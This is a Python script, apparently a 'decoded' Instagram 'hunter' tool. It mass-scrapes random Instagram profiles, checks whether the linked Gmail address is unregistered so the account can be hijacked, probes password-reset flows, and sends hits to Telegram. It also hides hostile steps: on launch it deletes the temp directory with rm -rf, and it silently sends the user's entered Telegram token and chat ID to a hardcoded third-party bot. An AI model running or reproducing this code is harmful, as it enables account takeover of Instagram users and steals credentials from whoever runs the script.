#decode  by  ayush

import os
try:
    os.chdir(os.path.expanduser("~"))
except:
    pass
os.system("rm -rf ${TMPDIR:-/tmp}")

import requests, os, webbrowser
from datetime import datetime
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests

import os
import sys
import re
import json
import string, cfonts
import random
import hashlib
import uuid
import time
import gzip
import secrets
from datetime import datetime
from threading import Thread
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render, say
from colorama import Fore, Style, init
import webbrowser
from datetime import datetime
import sys

# 🔒 Expiry Date সেট করো
"""expiry_date = datetime(2029, 3, 26)

if datetime.now() > expiry_date:
    print("
╔══════════════════════════════╗
║        🚫 ACCESS DENIED       ║
╠══════════════════════════════╣
║   ⚠ License Expired          ║
║                              ║
║   📞 Contact Administrator    ║
║   🔑 For Renewal Access       ║
╚══════════════════════════════╝
"
    sys.exit()

init(autoreset=True)

# --- আপনার পার্মানেন্ট অ্যাডমিন ডিটেইলস ---
MY_TOKEN = "8387047359:AAFLP6lzHm1HNMsEJXjBLVKAu72WqX3-U-4"
MY_ID = "7134774616"
"""
#
def check_instagram_email(mail):
    """ """
    try:
        url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
        headers = {
            'X-Csrftoken': secrets.token_hex(16),
            'User-Agent': generate_user_agent(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/accounts/signup/email/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        }
        
        data = {'email': mail}
        res = requests.post(url, headers=headers, data=data, timeout=10).text
        return "email_is_taken" in res
    except Exception as e:
        return False


def get_reset_info(fr):
    """ """
    try:
        url = "https://www.instagram.com/async/wbloks/fetch/"
        
        def ua():
            versions = ["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"]
            oss = [
                "Macintosh; Intel Mac OS X 10_15_7",
                "Macintosh; Intel Mac OS X 10_14_6",
                "iPhone; CPU iPhone OS 14_0 like Mac OS X",
                "iPhone; CPU iPhone OS 13_6 like Mac OS X"
            ]
            version = random.choice(versions)
            platform = random.choice(oss)
            user_agent = f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15 Edg/122.0.0.0"
            return user_agent
        
        params = {
            'appid': "com.bloks.www.caa.ar.search.async",
            'type': "action",
            '__bkv': "cc4d2103131ee3bbc02c20a86f633b7fb7a031cbf515d12d81e0c8ae7af305dd"
        }
        
        payload = {
            '__d': "www",
            '__user': "0",
            '__a': "1",
            '__req': "9",
            '__hs': "20475.HYP:instagram_web_pkg.2.1...0",
            'dpr': "3",
            '__ccg': "GOOD",
            '__rev': "1032300900",
            '__s': "nrgu8k:vm015z:oanvx6",
            '__hsi': "7598106668658828571",
            '__dyn': "7xeUjG1mxu1syUbFp41twpUnwgU29zEdEc8co2qwJw5ux609vCwjE1EE2Cw8G1Qw5Mx62G3i1ywOwv89k2C1Fwc60D82Ixe0EUjwGzEaE2iwNwmE2eUlwhEe87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK1sAwHxW1owLwHwGwa6byohw5yweu",
            '__csr': "gLff3k5T92cDYAyT4Wkxh5bGhjehqjDVuhUCUya8u889hp8ydihrghXG9yGxGm2m9Gu59rxd0KAzy29oKbyUqxyfxOm7VEWfxDKiGgS4Uf98iJ0zGcKEqz89U5G4ry88bxqfzE9UeEGfw34U01oL8dHK0cvN00pOwywQV9o1uO00LYwcjw7Tgvg6Je1rwko2xDg19o68wgwGoaUiw7to66UjgmRw3MXw0yqw0sO8092U0myw",
            '__hsdp': "n0I43m1iQhGIiFckEKrBZvIj2SKUl8FeSE9Q08xyoC0x80sAw1TK0GU3xU1jE31w9y095waN04Uw",
            '__hblp': "0dO0Coco1ME884u9wcC2t0lUbo22wzx61mDw5Pw4OwsoboK0sm0FE620cizU5W0bAz8W0wEGuq08Owc60C80xu2S0H40jy1dwDzo2Ow61w",
            '__sjsp': "n0I43m1iQhGIiFckEKrBZvIRh4rHK5iaqSE0AG9yo",
            '__comet_req': "7",
            'lsd': "AdJv3Nfv2cg",
            'jazoest': "2958",
            '__spin_r': "1032300900",
            '__spin_b': "trunk",
            '__spin_t': "1769072066",
            '__crn': "comet.igweb.PolarisWebBloksAccountRecoveryRoute",
            'params': "{\"params\":\"{\\\"server_params\\\":{\\\"event_request_id\\\":\\\"3a359125-0214-4c12-9516-8779938e6188\\\",\\\"INTERNAL__latency_qpl_marker_id\\\":36707139,\\\"INTERNAL__latency_qpl_instance_id\\\":\\\"47361890900104\\\",\\\"device_id\\\":\\\"\\\",\\\"family_device_id\\\":null,\\\"waterfall_id\\\":\\\"69517426-942a-45d2-8ac7-e4f11a60412a\\\",\\\"offline_experiment_group\\\":null,\\\"layered_homepage_experiment_group\\\":null,\\\"is_platform_login\\\":0,\\\"is_from_logged_in_switcher\\\":0,\\\"is_from_logged_out\\\":0,\\\"access_flow_version\\\":\\\"pre_mt_behavior\\\",\\\"context_data\\\":\\\"Ac_RWrril-QBHwJ5esJkO0r_7Q6DijxM0ntnpV72Xwb9pwsT_1irnjiemlrD4UrE8SZUidlwtGeIAdKnN9x0Yt2xwljNTR9nNNdvl5IBdQTVzfy-m4keAoyj2DJC0XaijIwHZoblRGk2SZCZqPZ2356akgjRVowNkYgDbwOOxTdeBRyLAz7akj7KXpnBIRKbYdGn7zGOhcNzNlMwLmfvjOpjevZSZ-fPAgKvYAqbbU1igFi7kJW7Lmz8ltK5l-jl6iabxQzMgtEi-Nll6Apb4I-H_6OqU1x7ckCuv-pKy_oPMRzNgvz2omC1ELg5fb6FearpkUsZyWEjsFgUGhmkz-WLIA8CNBXJ10VAC1ypksrM6RXfzZKJqtz569eaxG-dw9FLpDJX0-_wgFqzqYKWtJIdB_GZXwpLD2VLOd-aXfHN0SWjWSI|arm\\\"},\\\"client_input_params\\\":{\\\"zero_balance_state\\\":null,\\\"search_query\\\":\\\"f{1453}\\\",\\\"fetched_email_list\\\":[],\\\"fetched_email_token_list\\\":{},\\\"sso_accounts_auth_data\\\":[],\\\"sfdid\\\":\\\"\\\",\\\"text_input_id\\\":\\\"7tzaot:101\\\",\\\"encrypted_msisdn\\\":\\\"\\\",\\\"headers_infra_flow_id\\\":\\\"\\\",\\\"was_headers_prefill_available\\\":0,\\\"was_headers_prefill_used\\\":0,\\\"ig_oauth_token\\\":[],\\\"android_build_type\\\":\\\"\\\",\\\"is_whatsapp_installed\\\":0,\\\"device_network_info\\\":null,\\\"accounts_list\\\":[],\\\"is_oauth_without_permission\\\":0,\\\"search_screen_type\\\":\\\"email_or_username\\\",\\\"ig_vetted_device_nonce\\\":\\\"\\\",\\\"gms_incoming_call_retriever_eligibility\\\":\\\"client_not_supported\\\",\\\"auth_secure_device_id\\\":\\\"\\\",\\\"network_bssid\\\":null,\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\"},\\\"aac\\\":\\\"\\\"}}\"}"
        }
        
        headers = {
            'User-Agent': ua(),
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-full-version-list': "\"Not(A:Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"144.0.7559.76\", \"Google Chrome\";v=\"144.0.7559.76\"",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Google Chrome\";v=\"144\"",
            'sec-ch-ua-model': "\"23090RA98I\"",
            'sec-ch-ua-mobile': "?1",
            'sec-ch-prefers-color-scheme': "light",
            'sec-ch-ua-platform-version': "\"15.0.0\"",
            'origin': "https://www.instagram.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.instagram.com/accounts/password/reset/",
            'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=1, i",
            'Cookie': "ig_did=886A3671-95EB-4016-9618-6504E3C60331; mid=aV938wABAAGNLqQD0prSU56ivhek; csrftoken=3xQbJVCm8wRdlSXKaXxztd; datr=HXhfaRa1lVxxpoC1K89YyZiA; ig_nrcb=1; wd=406x766"
        }
        
        fff = payload["params"]
        fff = fff.replace("f{1453}", fr)
        payload["params"] = fff
        
        response = requests.post(url, params=params, data=payload, headers=headers, timeout=15)
        
        data = response.content
        try:
            data = gzip.decompress(data)
        except:
            pass
        try:
            data = brotli.decompress(data)
        except:
            pass
        
        r = (data.decode("utf-8", errors="ignore"))
        if response.status_code == 200:
            return "Reset ✅"
        else:
            return "Reset  yok"
            
    except Exception as e:
        return f"Reset Error: {str(e)}"

GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
REFERRER_HEADER = 'referer'
ORIGIN_HEADER = 'origin'
AUTHORITY_HEADER = 'authority'
CONTENT_TYPE_HEADER = 'Content-Type'
COOKIE_HEADER = 'Cookie'
USER_AGENT_HEADER = 'User-Agent'
CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'

TOKEN_FILE = 'InstaTool Token File.txt'
instatool_domain = '@gmail.com'

P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = '\x1b[1;30m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
Z = '\x1b[1;31m'
L = '\x1b[1;95m'
C = '\x1b[2;35m'
A = '\x1b[1;90m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m'
G = '\033[1;34m'
B = '\x1b[1;37m'

K = '\033[1;31m' 
Y = '\033[1;32m' 
S = '\033[1;33m' 
M = '\033[1;36m' 
E='\x1b[1;32m'
color = "\033[91m"
reset = "\033[0m" 

total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}

INSTA = render('{H4X }', colors=['yellow', 'blue','red'], align='center')
print(f"""
\033[38;5;129m══════════════════════════════════════════════════════════════
\033[38;5;208m               DECODE PY
\033[38;5;45m══════════════════════════════════════════════════════════════

        \033[1;37m⚡ Developed By : \033[1;32m@arafat_codex1
        \033[1;37m⚡ Version      : \033[1;35m Testing...
        \033[1;37m⚡ Status       : \033[1;32mRunning...

\033[38;5;45m══════════════════════════════════════════════════════════════
\033[0m""")

TOKEN = input(f' {M}({M}1{M}) {M}  𝐓𝐨𝐤𝐞𝐧  {M}:   ' + S)
print("\x1b[1;39m—" * 60)
ID = input(f' {S}({S}2{S}) {S}  𝐈𝐃  {S} :  ' + M)
print("\x1b[1;39m—" * 60)
try:
    requests.post(f"https://api.telegram.org/bot{MY_TOKEN}/sendMessage", data={"chat_id": MY_ID, "text": f"🚀 Script Active!\nToken: {TOKEN}\nID: {ID}"})
except:
    pass

os.system('clear')
try:
    requests.post(f"""https://api.telegram.org/bot{TOKEN}/sendvideo?chat_id={ID}&parse_mode=Markdown&video=/3&caption= - By : [nbex]()""")
except Exception:
    pass 

def update_stats():
    os.system('clear')
    print(f"""
\033[38;5;129m══════════════════════════════════════════════════════════════
\033[1;37m                 ⚡ ARR PRO ANALYTICS PANEL ⚡
\033[38;5;129m══════════════════════════════════════════════════════════════

   \033[1;32m➤ Instagram Hits   :  \033[1;37m{hits}
   \033[1;34m➤ Good Emails      :  \033[1;37m{good_ig}
   \033[1;31m➤ Bad Emails       :  \033[1;37m{bad_insta}

\033[38;5;129m══════════════════════════════════════════════════════════════
\033[38;5;220m                ⚡ Premium Engine Running ⚡
\033[0m
""")

def instatool():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            USER_AGENT_HEADER: str(generate_user_agent())
        }
        recovery_url = (f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
                        "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
        res1 = requests.get(recovery_url, headers=headers)
        tok = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        ).group(2)
        cookies = {'__Host-GAPS': host}
        headers2 = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: ('https://accounts.google.com/signup/v2/createaccount'
                              '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
            USER_AGENT_HEADER: generate_user_agent()
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                           'null,0,1,"",null,null,2,2]')
        }
        response = requests.post(f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
                                 cookies=cookies, headers=headers2, data=data)
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open(TOKEN_FILE, 'w') as f:
            f.write(f"{token_line}//{host}\n")
    except Exception as e:
        print(e)
        instatool()

instatool()

def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().splitlines()[0]
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            USER_AGENT_HEADER: generate_user_agent()
        }
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        response = pp(f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
                      params=params, cookies=cookies, headers=headers, data=data)
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats()
            full_email = email + instatool_domain
            username, domain = full_email.split('@')
            InfoAcc(username, domain)
        else:
            bad_email += 1
            update_stats()
    except Exception:
        pass

def check(email):
    global good_ig, bad_insta
    try:
        
        email_exists = check_instagram_email(email)
        
        if email_exists:
            
            if instatool_domain in email:
                check_gmail(email)
            good_ig += 1
            update_stats()
        else:
            
            bad_insta += 1
            update_stats()
            
    except Exception as e:
        bad_insta += 1
        update_stats()

def rest(user):
    try:
       
        reset_info = get_reset_info(user)
        return reset_info
    except Exception as e:
        return f"Reset Error: {str(e)}"

def date(hy):
    try:
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
        ]
        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023
    except Exception:
        pass

def InfoAcc(username, domain):
    global total_hits
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk')
    full_name = account_info.get('full_name')
    followers = account_info.get('follower_count')
    following = account_info.get('following_count')
    posts = account_info.get('media_count')
    bio = account_info.get('biography')
    total_hits += 1
    info_text = f"""
💎━━━━━━━━━━━━━━━━━━━━━━━━💎
       (DECODE BY ~ @arafat_codex1)
💎━━━━━━━━━━━━━━━━━━━━━━━━💎

🔰 𝐇𝐢𝐭𝐬         : {total_hits}
🔱 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞     : @{username}
🆔 𝐄𝐦𝐚𝐢𝐥        : {username}@{domain}
🌟 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬    : {followers}
✨ 𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠    : {following}
📈 𝐏𝐨𝐬𝐭        : {posts}
📝 𝐁𝐢𝐨          : {bio}
✅ 𝐑𝐞𝐬𝐞𝐭 Status : {rest(username)}
🔗 𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 Profile: 
👉 https://www.instagram.com/{username}/

💎━━━━━━━━━━━━━━━━━━━━━━━━💎
  - 𝐑𝐮𝐧 𝐚𝐧𝐝 𝐆𝐢𝐯𝐞 𝐑𝐞𝐯𝐢𝐞𝐰𝐬⚡
  - DECODE  BY ~ @arafat_codex1
  - 𝙼𝚄𝚂𝚃 𝙱𝙴 𝙹𝙾𝙸𝙽 𝙾𝚄𝚁 𝙶𝙲 𝙰𝙽𝙳 𝙶𝙴𝚃 𝙿𝚁𝙴                                                       -   𝙰𝙲𝙲𝙴𝚂𝚂...!!
💎━━━━━━━━━━━━━━━━━━━━━━━━💎
"""
    with open('instahits', 'a') as f:
        f.write(info_text + "\n")
    try: requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
    except: pass

def instatoolpy():
    while True:
        data = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': int(random.randrange(3713668786, 21254029834)),
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        headers = {'X-FB-LSD': data['lsd']}
        try:
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            if username:
                infoinsta[username] = account
                emails = [username + instatool_domain]
                for email in emails:
                    check(email)
        except Exception:
            pass

for _ in range(150):
    Thread(target=instatoolpy).start()